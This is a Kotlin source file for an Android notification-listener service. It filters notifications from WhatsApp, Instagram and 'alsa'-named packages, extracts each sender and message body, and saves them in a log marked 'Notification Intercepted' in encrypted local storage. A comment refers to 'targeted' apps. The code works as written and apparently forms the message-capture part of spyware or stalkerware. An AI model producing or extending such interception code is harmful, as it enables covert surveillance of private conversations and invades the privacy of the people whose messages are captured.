package com.example

import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification

class AlsaNotificationListener : NotificationListenerService() {

    override fun onListenerConnected() {
        super.onListenerConnected()
        instance = this
        LocalEncryptedStorage.saveLog(this, "Notification Listener: Activated successfully")
    }

    override fun onListenerDisconnected() {
        super.onListenerDisconnected()
        instance = null
        LocalEncryptedStorage.saveLog(this, "Notification Listener: Deactivated")
    }

    override fun onNotificationPosted(sbn: StatusBarNotification?) {
        super.onNotificationPosted(sbn)
        val sbnNotNull = sbn ?: return
        val packageName = sbnNotNull.packageName
        
        // Read alerts from common targeted administrative applications or messaging platforms
        if (packageName == "com.whatsapp" || packageName == "com.instagram.android" || packageName.contains("alsa")) {
            val extras = sbnNotNull.notification.extras
            val title = extras.getString("android.title") ?: "Unknown"
            val text = extras.getCharSequence("android.text")?.toString() ?: ""
            LocalEncryptedStorage.saveLog(this, "Notification Intercepted [$packageName] | Sender: $title | Content: $text")
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification?) {
        super.onNotificationRemoved(sbn)
    }

    companion object {
        @Volatile
        private var instance: AlsaNotificationListener? = null

        fun isActive(): Boolean = instance != null
    }
}
